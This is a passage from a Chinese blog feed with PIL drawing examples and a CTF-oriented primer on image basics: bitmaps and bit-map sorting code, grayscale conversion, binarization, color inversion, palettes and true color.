<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw</div><div class="line"></div><div class="line">im01 =Image.open(<span class="string">"test.jpg"</span>)</div><div class="line"></div><div class="line">draw =ImageDraw.Draw(im01)</div><div class="line"></div><div class="line">draw.chord((<span class="number">0</span>,<span class="number">0</span>,<span class="number">200</span>,<span class="number">200</span>),<span class="number">0</span>, <span class="number">90</span>, fill = (<span class="number">255</span>,<span class="number">0</span>,<span class="number">0</span>))</div><div class="line"></div><div class="line">draw.chord((<span class="number">300</span>,<span class="number">300</span>,<span class="number">500</span>,<span class="number">500</span>), <span class="number">0</span>, <span class="number">-90</span>, fill = (<span class="number">0</span>,<span class="number">255</span>,<span class="number">0</span>))</div><div class="line"></div><div class="line">draw.chord((<span class="number">200</span>,<span class="number">200</span>,<span class="number">300</span>,<span class="number">300</span>), <span class="number">-90</span>, <span class="number">0</span>, fill = (<span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span>))</div><div class="line"></div><div class="line">im01.show()</div></pre></td></tr></table></figure>
<ol>
<li>Point</li>
</ol>
<p>定义：draw.point(xy,options)</p>
<p>含义：在给定的坐标点上画一些点。</p>
<p>坐标列表是包含2元组[(x,y),…]或者数字[x,y,…]的任何序列对象。</p>
<p>变量options的fill给定点的颜色。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw</div><div class="line"></div><div class="line">im01 = Image.open(<span class="string">"test.jpg"</span>)</div><div class="line"></div><div class="line">draw = ImageDraw.Draw(im01)</div><div class="line"></div><div class="line">draw.point([(<span class="number">0</span>,<span class="number">0</span>),(<span class="number">100</span>,<span class="number">150</span>), (<span class="number">110</span>, <span class="number">50</span>)], fill = (<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>))</div><div class="line"></div><div class="line">draw.point([<span class="number">0</span>,<span class="number">10</span>,<span class="number">100</span>,<span class="number">110</span>, <span class="number">210</span>, <span class="number">150</span>], fill = (<span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>))</div><div class="line"></div><div class="line">im01.show()</div></pre></td></tr></table></figure>
<p>还有一些诸如绘制图形，折线之类的方法就不多赘述了，参考<a href="http://blog.csdn.net/icamera0/article/details/50747084" target="_blank" rel="external">博客</a>，接下来我们利用学的两个模块来分析一个脚本。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python3</span></div><div class="line"><span class="keyword">from</span> ast <span class="keyword">import</span> literal_eval <span class="keyword">as</span> make_tuple</div><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw</div><div class="line">f = open(<span class="string">'p&amp;s.txt'</span>, <span class="string">'r'</span>)</div><div class="line">points = [make_tuple(line) <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines()]</div><div class="line">f.close()</div><div class="line">image = Image.new(<span class="string">'RGB'</span>, (<span class="number">270</span>, <span class="number">270</span>), <span class="string">'#ffffff'</span>)</div><div class="line">draw = ImageDraw.Draw(image)</div><div class="line"><span class="keyword">for</span> point <span class="keyword">in</span> points:</div><div class="line">	draw.point(point, fill=<span class="string">"#000000"</span>)</div><div class="line">image.save(<span class="string">'qrcode.png'</span>)</div></pre></td></tr></table></figure>
<p>这个代码中打开txt文件，将其中的坐标点画成黑色，使用到了我们的ImageDraw，那么我们可以尝试着去使用只用Image改写这个脚本来验证今天学习的成果：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/env python3</span></div><div class="line"><span class="keyword">from</span> ast <span class="keyword">import</span> literal_eval <span class="keyword">as</span> make_tuple</div><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"></div><div class="line">f = open(<span class="string">'p&amp;s.txt'</span>, <span class="string">'r'</span>)</div><div class="line">points = [make_tuple(line) <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines()]</div><div class="line">f.close()</div><div class="line">image = Image.new(<span class="string">'RGB'</span>, (<span class="number">270</span>, <span class="number">270</span>), <span class="string">'#ffffff'</span>)</div><div class="line"><span class="keyword">for</span> point <span class="keyword">in</span> points:</div><div class="line"> 	image.putpixel((point[<span class="number">0</span>]<span class="number">-1</span>, point[<span class="number">1</span>]<span class="number">-1</span>), (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</div><div class="line">image.save(<span class="string">"qrcode.png"</span>)</div></pre></td></tr></table></figure>
<p>这样就完成了，那么PIL学习的第一天就先告一段落吧！</p>
]]></content>
      
        <categories>
            
            <category> 图形处理 python脚本 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CTF-图像学基础]]></title>
      <url>/2017/10/30/CTF-%E5%9B%BE%E5%83%8F%E5%AD%A6%E5%9F%BA%E7%A1%80/</url>
      <content type="html"><![CDATA[<p>似乎要一脚踏进了计算机图像学的大坑？不存在的</p>
<a id="more"></a>
<h1 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h1><p>随着在CTF道路上的前进，从一开始看到图种都惊为天人的小白，到现在三板斧就能砍死这种杂碎的时候，中间肯定是经历了一些惨痛的经历的。但是由于隐写术这方面的学习路线并没有一个很成体系的学习方向，只能说在做题的过程中，了解到了各种密码学的知识，图像学的知识，可这些领域都算是过于陌生。现在只能算是入了门，但是我深刻的体会到在现在的做题中缺乏了对应的知识完全是寸步难行，所以决定总结一篇关于图像学方面的基础。</p>
<h2 id="0x01位图"><a href="#0x01位图" class="headerlink" title="0x01位图"></a>0x01位图</h2><p>位图可以有两种概念，一种是指使用像素阵列来表示的图像，哟可以称作栅格图或者是点阵图。</p>
<p>还有一种则是指数据结构上的位图，也就是Bit-map，也就是用一个bit位去标记某个元素对应的value值，这个Key值即为该元素。由于采用了bit为单位去存储数据，因此在存储空间的方面可以大大地节省。</p>
<p>下面举一个例子来说明什么是Bit-map的村塾。假设我们现在需要对0-7内的五个元素去进行排序（这里假设为4，5，7，3，2），先假设这些元素并没有重复。</p>
<p>要表示8个数，我们就只需要8个Bit（1Bytes），首先我们开辟1Byte的空间，将这些空间的所有Bit位都置为0</p>
<p>然后遍历这5个元素，首先第一个元素是4，那么就把4对应的位置为1（可以这样操作 p+(i/8)|(0×01&lt;&lt;(i%8)) 当然了这里的操作涉及到Big-ending和Little-ending的情况，这里默认为Big-ending）,因为是从零开始的，所以要把第五位置为1。</p>
<p>然后再处理第二个元素5，将第六个位置置为1，如此直至处理完所有的元素，将相应的位置置为1。</p>
<p>然后我们现在遍历一遍Bit区域，将该位是一的位的编号输出（2，3，4，5，7），这样就达到了排序的目的。</p>
<p>其实就是把计数排序用的统计数组的每个单位缩小成bit级别的布尔数组，一种非常精妙的方式，然后看看实现的方式；</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- encoding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bitmap</span><span class="params">()</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,max)</span>:</span></div><div class="line">        <span class="string">'确定所需数组个数'</span></div><div class="line">        self.size = int ((max + <span class="number">31</span> - <span class="number">1</span>) / <span class="number">31</span>)</div><div class="line">        self.array = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(self.size)]</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">bitindex</span><span class="params">(self,num)</span>:</span></div><div class="line">        <span class="string">'确定数组中元素的位索引'</span></div><div class="line">        <span class="keyword">return</span> num % <span class="number">31</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_1</span><span class="params">(self,num)</span>:</span></div><div class="line">        <span class="string">'将元素所在的位置1'</span></div><div class="line">        elemindex = num / <span class="number">31</span></div><div class="line">        byteindex = self.bitindex(num)</div><div class="line">        ele = self.array[elemindex]</div><div class="line">        self.array[elemindex] = ele | (<span class="number">1</span> &lt;&lt; byteindex)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_1</span><span class="params">(self,i)</span>:</span></div><div class="line">        <span class="string">'检测元素存在的位置'</span></div><div class="line">        elemindex = i / <span class="number">31</span></div><div class="line">        byteindex = self.bitindex(i)</div><div class="line">        <span class="keyword">if</span> self.array[elemindex] &amp; (<span class="number">1</span> &lt;&lt; byteindex):</div><div class="line">            <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    Max = ord(<span class="string">'z'</span>)</div><div class="line">    suffle_array = [x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">'qwelmfg'</span>]</div><div class="line">    result = []</div><div class="line">    bitmap = Bitmap(Max)</div><div class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> suffle_array:</div><div class="line">        bitmap.set_1(ord(c))</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(Max+<span class="number">1</span>):</div><div class="line">        <span class="keyword">if</span> bitmap.test_1(i):</div><div class="line">            result.append(chr(i))</div><div class="line">    <span class="keyword">print</span> <span class="string">u'原始数组为:    %s'</span> % suffle_array</div><div class="line">    <span class="keyword">print</span> <span class="string">u'排序后的数组为: %s'</span> % result</div></pre></td></tr></table></figure>
<p>当然还有一个看起来更加简洁的C++版，但是并不是那么的友好：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MASK  0X1F</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> SHIFT 5    </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> WORD 32   <span class="comment">// the bits of a word</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> N 10000000   <span class="comment">//the max number</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">int</span> bitmap[N/WORD];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">bitmap_set</span><span class="params">(<span class="keyword">int</span> i)</span></span>&#123;</div><div class="line">    bitmap[i&gt;&gt;SHIFT] |= <span class="number">1</span> &lt;&lt; (i &amp; MASK);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitmap_test</span><span class="params">(<span class="keyword">int</span> i)</span></span>&#123;</div><div class="line">    <span class="keyword">return</span> bitmap[i&gt;&gt;SHIFT] &amp; (<span class="number">1</span> &lt;&lt; (i&amp;MASK));</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">bitmap_clear</span><span class="params">(<span class="keyword">int</span> i)</span></span>&#123;</div><div class="line">    bitmap[i&gt;&gt;SHIFT] &amp;= ~(<span class="number">1</span> &lt;&lt; (i &amp; MASK));</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">    bitmap_set(<span class="number">38</span>);</div><div class="line">    <span class="keyword">int</span> two = bitmap_test(<span class="number">38</span>);</div><div class="line">    <span class="built_in">cout</span> &lt;&lt; two &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">    bitmap_clear(<span class="number">38</span>);</div><div class="line">    two = bitmap_test(<span class="number">38</span>);</div><div class="line">    <span class="built_in">cout</span> &lt;&lt; two &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这种在索引和数据压缩等方面有广泛的应用，代表了有限域中的稠集。</p>
<p>位图的像素都分配有特定的位置和的颜色值。每个像素的颜色信息由RGB组合或者灰度值表示。</p>
<p>根据位深度，可以将位图分为1、4、8、16、24及32位图像等。每个像素使用的信息位数越多，可用的颜色就越多，颜色表现的就越逼真，那么相应的数据量也会越大。例如位深度位1的像素位图只有两个可能的值(黑色和白色)，所以又称为二值位图。</p>
<p>下面就来看一下彩色图像，灰度图像（灰度图是一种特殊的伪彩色图）和二值图像的一个对比，这样应该会更加清楚：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-30%20%E4%B8%8A%E5%8D%8812.43.23.png" alt="屏幕快照 2017-10-30 上午12.43.23.png" title="" class="">
                <p>屏幕快照 2017-10-30 上午12.43.23.png</p>
            </figure>
<h2 id="0x02图像处理"><a href="#0x02图像处理" class="headerlink" title="0x02图像处理"></a>0x02图像处理</h2><p>了解到了一些基本的概念之后，我们再来讨论一下计算机的几种图像处理方式：</p>
<h3 id="灰度化"><a href="#灰度化" class="headerlink" title="灰度化"></a>灰度化</h3><p>在RGB模型中，如果R=G=B时，则彩色表示一种灰度颜色，其中R=G=B的值叫灰度值，因此，灰度图像每个像素只需一个字节存放灰度值（又称强度值、亮度值），灰度范围为0-255。一般有以下四种方法对彩色图像进行灰度化： 　　</p>
<ol>
<li>分量法 　　</li>
</ol>
<p>将彩色图像中的三分量的亮度作为三个灰度图像的灰度值，可根据应用需要选取一种灰度图像。f1(i,j)=R(i,j) f2(i,j)=G(i,j) f3(i,j)=B(i,j) 其中fk(i,j)(k=1,2,3)为转换后的灰度图像在（i,j）处的灰度值。</p>
<ol>
<li>最大值法</li>
</ol>
<p>将彩色图像中的三分量亮度的最大值作为灰度图的灰度值。 　　f(i,j)=max(R(i,j),G(i,j),B(i,j)) 　　</p>
<ol>
<li>平均值法 　　</li>
</ol>
<p>将彩色图像中的三分量亮度求平均得到一个灰度图。 　　f(i,j)=(R(i,j)+G(i,j)+B(i,j)) /3 　　</p>
<ol>
<li>加权平均法 　　</li>
</ol>
<p>根据重要性及其它指标，将三个分量以不同的权值进行加权平均。由于人眼对绿色的敏感最高，对蓝色敏感最低，因此，按下式对RGB三分量进行加权平均能得到较合理的灰度图像。 　　f(i,j)=0.30R(i,j)+0.59G(i,j)+0.11B(i,j))</p>
<h3 id="二值化"><a href="#二值化" class="headerlink" title="二值化"></a>二值化</h3><ol>
<li>全局二值化</li>
</ol>
<p>一幅图像包括目标物体、背景还有噪声，要想从多值的数字图像中直接提取出目标物体，最常用的方法就是设定一个全局的阈值T，用T将图像的数据分成两部分：大于T的像素群和小于T的像素群。将大于T的像素群的像素值设定为白色（或者黑色），小于T的像素群的像素值设定为黑色（或者白色）。</p>
<p>全局二值化，在表现图像细节方面存在很大缺陷。为了弥补这个缺陷，出现了局部二值化方法。</p>
<ol>
<li>局部二值化</li>
</ol>
<p>局部二值化的方法就是按照一定的规则将整幅图像划分为N个窗口，对这N个窗口中的每一个窗口再按照一个统一的阈值T将该窗口内的像素划分为两部分，进行二值化处理。</p>
<p>局部二值化也有一个缺陷。这个缺陷存在于那个统一阈值的选定。这个阈值是没有经过合理的运算得来，一般是取该窗口的平局值。这就导致在每一个窗口内仍然出现的是全局二值化的缺陷。为了解决这个问题，就出现了局部自适应二值化方法。</p>
<ol>
<li>局部自适应二值化</li>
</ol>
<p>该方法就是在局部二值化的基础之上，将阈值的设定更加合理化。该方法的阈值是通过对该窗口像素的平均值E，像素之间的差平方P，像素之间的均方根值Q等各种局部特征，设定一个参数方程进行阈值的计算，例如：T=a<em>E+b</em>P+c*Q，其中a,b,c是自由参数。这样得出来的二值化图像就更能表现出二值化图像中的细节。</p>
<h3 id="反色"><a href="#反色" class="headerlink" title="反色"></a>反色</h3><p>反色的实际含义是将R、G、B值反转。若颜色的量化级别是256，则新图的R、G、B值为255减去原图的R、G、B值。这里针对的是所有图，包括真彩图、带调色板的彩色图(又称为伪彩色图)、和灰度图。针对不同种类有不同的处理。先看看真彩图。我们知道真彩图不带调色板，每个像素用3个字节，表示R、G、B三个分量。所以处理很简单，把反转后的R、G、B值写入新图即可，比如一个点的颜色为(0,0,0)，反色后为(255,255,255)。再来看看带调色板的彩色图，我们知道位图中的数据只是对应调色板中的一个索引值，我们只需要将调色板中的颜色反转，形成新调色板，而位图数据不用动，就能够实现反转。</p>
<p>灰度图是一种特殊的伪彩色图，只不过调色板中的R、G、B值都是一样的而已。所以反转的处理和上面讲的一样。</p>
<p>下面贴一下写的一个对灰度图像的本值，均值作分析的一个代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</div><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"><span class="keyword">from</span> pylab <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="comment">#设置存储的列表</span></div><div class="line">point_list = []</div><div class="line">power_list = []</div><div class="line"></div><div class="line"><span class="comment">#存储一开始矩阵的长度</span></div><div class="line">length = <span class="number">0</span></div><div class="line"><span class="comment">#设置矩阵的输出</span></div><div class="line">np.set_printoptions(threshold=<span class="string">'nan'</span>)</div><div class="line"></div><div class="line"><span class="comment">#得到所有的本值和坐标</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_allpoints</span><span class="params">(array)</span>:</span></div><div class="line">    x_range = range(<span class="number">2</span>, len(array)<span class="number">-2</span>)</div><div class="line">    y_range = x_range</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> x_range:</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> y_range:</div><div class="line">            point_list.append([i, j, array[i, j]])</div><div class="line">    <span class="keyword">return</span> point_list</div><div class="line"></div><div class="line"><span class="comment">#根据得到的本值坐标计算均值并加入对应列表</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_all_averageValue</span><span class="params">(point_range, array)</span>:</span></div><div class="line">    <span class="keyword">for</span> point <span class="keyword">in</span> point_range:</div><div class="line">        temp = get_averageValue(array, point[<span class="number">0</span>], point[<span class="number">1</span>])</div><div class="line">        point.append(temp)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_averageValue</span><span class="params">(array, x ,y)</span>:</span></div><div class="line">    <span class="keyword">return</span> get_aroundValue(array, x, y)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_aroundValue</span><span class="params">(array, x, y)</span>:</span></div><div class="line">    average_sum = <span class="number">0</span></div><div class="line">    rangeListX = range(x<span class="number">-1</span>, x+<span class="number">2</span>)</div><div class="line">    rangeListY = range(y<span class="number">-1</span>, y+<span class="number">2</span>)</div><div class="line"><span class="comment">#    print(rangeListX)</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> rangeListX:</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> rangeListY:</div><div class="line">                average_sum += array[i][j]</div><div class="line">    average_sum -= array[x][y]</div><div class="line">    average_sum /= <span class="number">8</span></div><div class="line"><span class="comment">#    print(average_sum)</span></div><div class="line">    <span class="keyword">return</span> average_sum</div><div class="line"></div><div class="line"><span class="comment">#得到所有的作用力点</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_allPowerPoint</span><span class="params">(array)</span>:</span></div><div class="line">    power_sum = <span class="number">0</span></div><div class="line">    start = length - <span class="number">3</span></div><div class="line">    <span class="keyword">while</span> start &lt; ((length<span class="number">-4</span>)*(length<span class="number">-5</span>)<span class="number">-1</span>):</div><div class="line">        power_sum = get_aroundPower(array, start)</div><div class="line">        power_list.append([array[start][<span class="number">0</span>], array[start][<span class="number">1</span>], array[start][<span class="number">2</span>], array[start][<span class="number">3</span>], power_sum])</div><div class="line">        <span class="keyword">if</span> start%(length<span class="number">-4</span>) == (length<span class="number">-6</span>):</div><div class="line">            start += <span class="number">3</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            start += <span class="number">1</span></div><div class="line"><span class="comment">#        print(start)</span></div><div class="line">        print(length)</div><div class="line">    <span class="keyword">return</span> power_list</div><div class="line"></div><div class="line"><span class="comment">#将每个点的作用力存入列表</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_aroundPower</span><span class="params">(array, start)</span>:</span></div><div class="line">    power_sum = <span class="number">0</span></div><div class="line">    power_sum += array[start+<span class="number">1</span>][<span class="number">2</span>] + array[start<span class="number">-1</span>][<span class="number">2</span>] + array[start<span class="number">-216</span>][<span class="number">2</span>] + array[start+<span class="number">216</span>][<span class="number">2</span>] + array[start+<span class="number">215</span>][<span class="number">2</span>] + array[start<span class="number">-215</span>][<span class="number">2</span>] + array[start+<span class="number">217</span>][<span class="number">2</span>] + array[start<span class="number">-217</span>][<span class="number">2</span>]</div><div class="line">    <span class="keyword">return</span> power_sum</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</div><div class="line">        path = raw_input(<span class="string">"Please input the image path: "</span>)</div><div class="line">        image = Image.open(path).convert(<span class="string">"L"</span>)</div><div class="line">        image_array = np.array(image)</div><div class="line">        new_image_array = image_array/<span class="number">255.0</span>;</div><div class="line">        length = len(new_image_array)</div><div class="line">        a = get_allpoints(new_image_array)</div><div class="line">        get_all_averageValue(a, new_image_array)</div><div class="line">        b = get_allPowerPoint(a)</div><div class="line">        print(power_list)</div></pre></td></tr></table></figure>
<h2 id="0x03调色板"><a href="#0x03调色板" class="headerlink" title="0x03调色板"></a>0x03调色板</h2><p>我们知道，自然界中的所有颜色都可以由红、绿、蓝(R，G，B)组合而成。有的颜色含有红色成分多一些，如深红；有的含有红色成分少一些，如浅红。针对含有红色成分的多少，可以分成0到255共256个等级，0级表示不含红色成分；255级表示含有100%的红色成分。同样，绿色和蓝色也被分成256级。这种分级概念称为量化。</p>
<p>这样，根据红、绿、蓝各种不同的组合我们就能表示出256×256×256，约1600万种颜色。这么多颜色对于我们人眼来说已经足够丰富了。</p>
<p>你大概已经明白了，当一幅图中每个像素赋予不同的RGB值时，能呈现出五彩缤纷的颜色了，这样就形成了彩色图。的确是这样的，但实际上的做法还有些差别。</p>
<p>让我们来看看下面的例子。</p>
<p>​        有一个长宽各为200个像素，颜色数为16色的彩色图，每一个像素都用R、G、B三个分量表示。因为每个分量有256个级别，要用8位(bit)，即一个字节(byte)来表示，所以每个像素需要用3个字节。整个图象要用200×200×3，约120k字节，可不是一个小数目呀！如果我们用下面的方法，就能省的多。</p>
<p>​        因为是一个16色图，也就是说这幅图中最多只有16种颜色，我们可以用一个表：表中的每一行记录一种颜色的R、G、B值。这样当我们表示一个像素的颜色时，只需要指出该颜色是在第几行，即该颜色在表中的索引值。举个例子，如果表的第0行为255，0，0(红色)，那么当某个像素为红色时，只需要标明0即可。</p>
<p>​        让我们再来计算一下：16种状态可以用4位(bit)表示，所以一个像素要用半个字节。整个图象要用200×200×0.5，约20k字节，再加上表占用的字节为3×16=48字节.整个占用的字节数约为前面的1/6，省很多吧？</p>
<p>这张R、G、B的表，就是我们常说的调色板(Palette)，另一种叫法是颜色查找表LUT(Look Up Table)，似乎更确切一些。Windows位图中便用到了调色板技术。其实不光是Windows位图，许多图象文件格式如pcx、tif、gif等都用到了。所以很好地掌握调色板的概念是十分有用的。</p>
<h4 id="真彩色"><a href="#真彩色" class="headerlink" title="真彩色"></a>真彩色</h4><p>有一种图，它的颜色数高达256×256×256种，也就是说包含我们上述提到的R、G、B颜色表示方法中所有的颜色，这种图叫做真彩色图(true color)。真彩色图并不是说一幅图包含了所有的颜色，而是说它具有显示所有颜色的能力，即最多可以包含所有的颜色。表示真彩色图时，每个像素直接用R、G、B三个分量字节表示，而不采用调色板技术。原因很明显：如果用调色板，表示一个像素也要用24位，这是因为每种颜色的索引要用24位(因为总共有2^24种颜色，即调色板有2^24行)，和直接用R，G，B三个分量表示用的字节数一样，不但没有任何便宜，还要加上一个256×256×256×3个字节的大调色板。所以真彩色图直接用R、G、B三个分量表示，它又叫做24位色图。</p>
<p>我们知道，真彩图中包含最多达2^24种颜色，怎样从中选出256种颜色，又要使颜色的失真比较小，这是一个比较复杂的问题。一种简单的做法是将R：G：B以3：3：2表示，即取R，G的高3位，B的高两位，组成一个字节，这样就可以表示256种颜色了，但不难想象，这种方法的失真肯定很严重。</p>
<p>我们下面介绍的算法能够比较好地实现真彩图到256色图的转换。它的思想是：准备一个长度为4096的数组，代表4096种颜色。对图中的每一个像素，取R、G、B的最高四位，拼成一个12位的整数，对应的数组元素加1。全部统计完后，就得到了这4096种颜色的使用频率。其中，可能有一些颜色一次也没用到，即对应的数组元素为零(假设不为零的数组元素共有PalCounts个)。将这些为零的数组元素清除出去，使得前PalCounts个元素都不为零。将这PalCounts个数按从大到小的顺序排列。这样，前256种颜色就是用的最多的颜色，它们将作为调色板上的256种颜色。对于剩下的PalCounts-256种颜色并不是简单地丢弃，而是用前256种颜色中的一种来代替，代替的原则是找有最小平方误差的那个。再次对图中的每一个像素，取R、G、B的最高四位，拼成一个12位的整数，如果对应值在前256种颜色中，则直接将该索引值填入位图数据中，如果是在后PalCounts-256种颜色中，则用代替色的索引值填入位图数据中。</p>
<p>下面的两幅图中，图5.3是原真彩图，图.54是用上面的算法转换成的256色图，可以看出，效果还不错。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-30%20%E4%B8%8A%E5%8D%881.26.14.png" alt="屏幕快照 2017-10-30 上午1.26.14.png" title="" class="">
                <p>屏幕快照 2017-10-30 上午1.26.14.png</p>
            </figure>
